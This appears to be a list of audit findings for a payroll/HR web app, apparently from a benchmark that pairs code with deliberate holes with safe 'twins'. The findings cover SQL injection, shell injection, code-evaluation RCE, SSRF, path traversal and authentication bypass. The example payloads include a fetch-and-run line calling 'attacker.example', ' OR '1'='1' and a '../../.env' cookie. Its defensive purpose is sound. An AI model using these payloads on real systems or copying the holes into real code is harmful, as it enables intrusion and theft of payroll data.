extra.message: The `department` query parameter (compensation.history-by-department.tsx:10) flows into searchCompensationHistoryByDepartment, which interpolates it directly into a raw SQL string (`where d.name = '${departmentTerm}'`) executed via pool.query. An authenticated payroll/HR user can inject SQL (e.g. ' OR '1'='1) to read or alter arbitrary database data. The Safely twin uses a parameterized query.

The user-supplied `format` query parameter (documents.$documentId.export-format.tsx:19) is interpolated into a shell command string passed to exec(): `pandoc ${fullPath} -t ${format}`. A value such as `pdf; curl attacker.example/sh | sh` executes arbitrary OS commands on the server. The reviewed twin (convertDocumentForExportValidated) uses execFile with a format allowlist.

The `charset` query parameter (exports.payroll-legacy-feed.tsx:37) flows into transcodeExportForPartnerLocale, which spawns `iconv -f utf-8 -t ${localePreset}` with shell:true. Shell metacharacters in localePreset (e.g. `utf-8; id`) execute arbitrary commands. The verified twin validates the preset against an allowlist and spawns without a shell.

The `formula` query parameter (compensation.projection-formula.tsx:15) is passed to evaluateCompensationProjectionFormula, which evaluates it via `new Function(...)` with the raw user string — direct dynamic code evaluation leading to remote code execution on the server. The verified twin only dispatches to a fixed allowlist of formula functions.

The `welcomeLayout` query parameter (onboarding.welcome-message.tsx:11) is compiled with lodash.template(). lodash templates execute arbitrary JavaScript via `<% %>` blocks, so a layout like `<%= recipientName %><% process.exit(1) %>` gives remote code execution. The verified twin compiles a fixed server-side template only.

The `sourceUrl` form field (documents._index.tsx:100, intent=import_url) is fetched server-side by importDocumentFromSource without any scheme or host validation. An authenticated uploader can make the server issue requests to internal-only endpoints (cloud metadata at 169.254.169.254, internal admin panels, localhost services) and store the response body as a downloadable document — full-read SSRF.

readPolicyAttachmentFromRecents (called by policies.recent.tsx:8) uses the client-controlled `recentPolicyFile` cookie value directly as a filename in path.join(policyLibraryDir, fileName) with no traversal check. A cookie like `recentPolicyFile=../../.env` lets any authenticated user read arbitrary files on the server. The safe twin (used by policies.attachment.tsx) applies path.basename.

The `template` query parameter (onboarding.checklist-preview.tsx:14) is joined as `${templateName}.md` without validation. `../` sequences (e.g. `?template=../../../.env%00` or any path ending in .md) read arbitrary *.md files outside the template directory (path traversal). The safe twin resolves the path and verifies the prefix.

persistChecklistAnnotation (onboarding.checklist-assign.tsx:27) builds the output path as path.join(checklistAnnotationDir, `${sectionLabel}.txt`) using the raw `sectionLabel` form field. A sectionLabel containing `../../` allows arbitrary file writes of attacker-controlled `note` content anywhere the process can write. The safe twin applies path.basename and a prefix check.

saveShiftEvidencePhoto (field-crew.checkin.tsx:17) builds the stored filename from the raw upload's file.name (`${shiftId}-${file.name}`) and writes it into the web-served public/shift-evidence directory with no filename sanitization, size or MIME checks. A crafted filename like `../../app/evil` escapes the directory (arbitrary file write), and any uploaded 'evidence' file becomes publicly reachable. The validated twin sanitizes the name and stores privately.

The shift summary loader performs no authentication and trusts the `x-account-id` request header to select whose employee record to return, including the hourly rate derived from compensation records. Any unauthenticated caller can enumerate employee IDs and read payroll data (missing authentication / user-controlled key). The verified twin resolves the employee from the authenticated session via requireUser.

applyDisbursementNotice (payroll.processor-callback.tsx:10) decodes the notice payload via decodeDisbursementNotice without verifying its HMAC signature. Anyone who can POST to this unauthenticated callback can forge a 'paid' notice, flip hr_approved compensation requests to 'effective', and insert compensation records — a full authentication bypass of the payroll processor callback.
